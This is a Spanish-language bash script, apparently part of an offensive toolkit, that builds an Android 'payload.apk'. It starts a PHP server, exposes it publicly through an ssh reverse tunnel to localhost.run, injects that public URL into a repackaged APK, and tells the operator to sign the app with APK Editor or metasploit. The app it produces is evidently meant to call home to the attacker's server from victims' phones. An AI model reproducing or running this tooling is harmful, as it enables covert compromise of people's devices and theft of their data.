rm -fr .res
bash .banner
echo "Introduce la opcion a utilizar:"
echo ""
echo "01) Abrir Servidor"
echo "02) Crear Apk"
echo "03) Ayuda"
echo "04) Salir"
echo "
=============================
=                           =
=  Programado por: NePtYx   =
=                           =
============================="
echo ""
read -p "Opcion: " num

bash .banner

if [ "$num" = "1" ]; then
echo "Copia el primer url que ves abajo y pegalo en la opcion que sigue!!"
echo ""
php -S localhost:8080 -t .st/ | ssh -R 80:localhost:8080 ssh.localhost.run
fi

if [ "$num" = "2" ]; then
read -p "Intrdouce el enlace anteriormente copiado: " enlace
ps=$(mkdir .res ; mv base.apk .res/ ; cd .res/ ;unzip base.apk ; mv base.apk ../ ; cd ..)
kd=$(echo "$enlace" > .res/assets/url.txt)
ja=$(mkdir $HOME/MgToLs/Payload ; cd .res ; zip -r payload.apk * ; mv payload.apk $HOME/MgToLs/Payload/payload.apk ; cd ..)
ko=$(cp $HOME/MgToLs/.apked -r $HOME/MgToLs/Payload/APK_EDITOR.APK)
echo ""
echo "${0} esta trabajando, porfavor espera..."
sleep 5
bash .banner
echo "Aplicacion creada correctamente y se encuentra en:"
echo "$HOME/MgToLs/Payload/payload.apk"
echo ""
read -sp "Presiona una tecla para continuar..." pause
bash .banner
echo "Ahora debes de instalar Apk Editor y firmar el apk, esto se hace presionando"
echo "luego de eso abre la app y busca la apk modificada y editala completa."
echo "Ahora presiona el boton que dice guardar y listo."
echo ""
echo "(Tambien puedes usar metasploit para firmarla)"
echo ""
read -sp "Presiona una tecla para continuar..." pause
bash .perm
fi

if [ "$num" = "3" ]; then
cat Readme.txt
echo ""
read -sp "Presiona una tecla para continuar..." pause
bash ${0}
fi

if [ "$num" = "4" ]; then
echo "                     Gracias por usar ${0}!!"
echo ""
fi
